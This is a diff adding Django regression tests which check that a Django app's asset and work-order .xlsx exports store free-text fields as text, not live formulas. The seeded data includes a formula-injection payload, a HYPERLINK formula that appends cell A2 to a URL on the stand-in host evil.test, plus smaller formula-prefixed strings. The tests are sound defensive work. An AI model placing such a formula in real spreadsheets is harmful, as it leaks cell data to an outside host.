@@ -8444,3 +8444,93 @@ class DeriveCollaudoRulesTests(TestCase):
             self.assertEqual(MaintenanceRule.objects.filter(asset_category=cat).count(), 0)
             self.assertEqual(AssetMaintenanceRuleState.objects.filter(asset=asset).count(), 0)
             self.assertIn("DRY-RUN", out.getvalue())
+
+
+class AssetXlsxFormulaInjectionTests(TestCase):
+    """Formula injection negli export .xlsx del modulo assets.
+
+    Nome/note/descrizioni degli asset sono testo libero: openpyxl scriverebbe
+    come formula viva ('f') qualunque stringa che inizia con "=" (o + - @),
+    valutata all'apertura in Excel. Devono restare testo. Dati sintetici.
+    """
+
+    EVIL = '=HYPERLINK("http://evil.test?d="&A2,"clicca")'
+
+    def setUp(self):
+        self.user = get_user_model().objects.create_superuser(
+            username="asset-xlsx-injection",
+            email="asset-xlsx-injection@example.invalid",
+            password="pwd12345",
+        )
+        self.client.force_login(self.user)
+        self.asset = Asset.objects.create(
+            asset_tag="EVIL-001",
+            name=self.EVIL,
+            asset_type=Asset.TYPE_WORK_MACHINE,
+            reparto="@SUM(A1)",
+            notes="+1+1",
+            source_key="manual-xlsx-injection",
+        )
+
+    def _cells(self, content):
+        workbook = load_workbook(io.BytesIO(content))
+        try:
+            for sheet in workbook.worksheets:
+                for row in sheet.iter_rows():
+                    for cell in row:
+                        yield sheet.title, cell
+        finally:
+            workbook.close()
+
+    def _assert_no_live_formula(self, response):
+        self.assertEqual(response.status_code, 200)
+        self.assertIn("spreadsheetml", response["Content-Type"])
+        values = []
+        for title, cell in self._cells(response.content):
+            self.assertNotEqual(
+                cell.data_type, "f",
+                f"{title}!{cell.coordinate} = {cell.value!r} scritta come formula",
+            )
+            values.append(cell.value)
+        self.assertIn(self.EVIL, values)  # il valore c'e', ma come testo
+
+    def test_asset_list_export_xlsx_has_no_live_formula(self):
+        response = self.client.get(reverse("assets:asset_list_export"), {"format": "xlsx"})
+        self._assert_no_live_formula(response)
+
+    def test_work_machine_export_excel_has_no_live_formula(self):
+        response = self.client.get(reverse("assets:work_machine_export_excel"))
+        self._assert_no_live_formula(response)
+
+    def test_asset_detail_export_xlsx_has_no_live_formula(self):
+        response = self.client.get(
+            reverse("assets:asset_detail_export_xlsx", args=[self.asset.id])
+        )
+        self._assert_no_live_formula(response)
+
+    def test_workorder_export_xlsx_has_no_live_formula(self):
+        WorkOrder.objects.create(
+            asset=self.asset,
+            title=self.EVIL,
+            description="-2+3",
+            kind=WorkOrder.KIND_CORRECTIVE,
+        )
+        response = self.client.get(
+            reverse("assets:workorder_list_export"), {"format": "xlsx", "scope": "full"}
+        )
+        self._assert_no_live_formula(response)
+
+    def test_export_still_typed_and_intact_for_benign_values(self):
+        """Non-regressione: intestazioni, valori legittimi e stili restano invariati."""
+        response = self.client.get(reverse("assets:work_machine_export_excel"))
+        self.assertEqual(response.status_code, 200)
+        workbook = load_workbook(io.BytesIO(response.content))
+        try:
+            sheet = workbook["Macchine officina"]
+            self.assertEqual(sheet["A1"].value, "Tag")
+            self.assertTrue(sheet["A1"].font.bold)  # stile intestazione preservato
+            self.assertEqual(sheet["A2"].value, "EVIL-001")
+            self.assertEqual(sheet["A2"].data_type, "s")
+            self.assertFalse(sheet["A2"].quotePrefix)  # valore benigno: nessun quote prefix
+        finally:
+            workbook.close()
